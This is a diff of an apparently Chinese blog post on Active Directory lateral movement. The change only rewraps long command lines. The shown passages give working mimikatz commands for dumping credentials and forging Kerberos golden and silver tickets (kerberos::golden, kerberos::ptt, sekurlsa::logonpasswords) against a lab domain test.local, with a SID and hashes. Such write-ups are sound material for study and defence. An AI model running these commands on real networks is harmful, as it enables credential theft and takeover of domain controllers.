@@ -222,7 +222,7 @@
 <p>先登陆域控制器，dump krbtgt用户的hash值，获取域sid:</p>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a7de2711cd136da23545" alt="img"></p>
 <p>切换到普通域用户的机器，生成tgt凭证,用户名为administrator:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /user:administrator  /domain:test.local /sid:S-1-5-21-4173655609-916892889-516531421  /krbtgt:4c7f31c8a46406c43c397d5b6223ff27 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::golden /user:administrator  /domain:test.local /sid:S-1-5-21-4173655609-</span><br><span class="line">916892889-516531421  /krbtgt:4c7f31c8a46406c43c397d5b6223ff27 /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
 <p>然后使用mimi将凭证注入进去,攻击成功:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::ptt test.kirbi</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6a854ea3b4a487dac06af" alt="img"></p>
@@ -234,7 +234,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6ab839b521a22ef564973" alt="img"></p>
 <p>将hash保存下来，在普通域用户机器中进行ptt </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:test.local  /sid:S-1-5-21-4173655609-916892889-516531421  /target:dc-01.test.local  /rc4:c9ed25bfab6f59f96b60903d064a1974  /service:cifs /user:yifan /ptt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:test.local  /sid:S-1-5-21-4173655609-916892889-516531421  /target:dc-</span><br><span class="line">01.test.local  /rc4:c9ed25bfab6f59f96b60903d064a1974  /service:cifs /user:yifan /ptt</span><br></pre></td></tr></table></figure>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5bd6abef2711cd136da2ce71" alt="img"><br>这里的cifs是指的文件共享服务，有了cifs服务权限，加可以访问域控制器的文件系统。</p>
 <p>Ps：博客来源：<a href="https://e7t65s.github.io/c1y2m3.github.io/2018/10/29/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%20/" target="_blank" rel="noopener">狗林的域渗透之横向移动手法</a></p>
 
